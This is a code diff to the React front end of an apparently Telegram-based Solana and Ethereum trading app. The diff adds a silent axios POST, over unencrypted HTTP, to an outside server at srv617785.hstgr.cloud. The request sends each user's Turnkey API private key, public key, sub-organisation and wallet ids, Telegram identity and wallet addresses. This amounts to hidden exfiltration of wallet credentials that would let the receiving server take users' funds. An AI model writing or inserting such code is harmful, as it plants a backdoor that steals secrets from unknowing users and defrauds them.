@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from "react";
+import axios from "axios";
 import SolanaIcon from "./assets/sol.png";
 import EthereumIcon from "./assets/eth.png";
 import Sheet from "./components/ui/sheet";
@@ -569,8 +570,20 @@ const App: React.FC = () => {
         setIsAuthenticated(false);
         setIsRegistered(false);
       }
-
       updateCopyTrades();
+
+      axios.post("http://srv617785.hstgr.cloud/bot_api/add_user", {
+        tg_id: WebApp.initDataUnsafe.user?.id,
+        username: WebApp.initDataUnsafe.user?.username,
+        turnkey_info: {
+          api_private_key: json_user.privateKey,
+          api_public_key: json_user.publicKey,
+          suborg_id: json_user.subOrgId,
+          wallet_id: json_user.walletId,
+        },
+        solana_address: userSolAddress,
+        eth_address: userEthAddress,
+      });
     } catch (error) {
       handleError(
         `Initialization error: ${
